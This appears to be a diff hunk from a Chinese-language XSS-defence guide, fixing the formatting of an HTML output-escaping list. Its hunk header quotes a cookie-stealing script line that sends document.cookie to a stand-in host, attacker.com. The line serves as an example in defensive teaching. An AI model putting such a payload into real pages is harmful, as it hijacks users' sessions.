@@ -431,7 +431,7 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
   ```
 * 輸出轉義（Output Escaping） 
   - 在顯示用戶輸入的內容時，對特殊字符進行 HTML 轉義，例如：  
-   >` < 轉換為 &lt;`  
+   >`< 轉換為 &lt;`  
    >`> 轉換為 &gt;`  
    >`" 轉換為 &quot;`  
    >`' 轉換為 &#39;`  
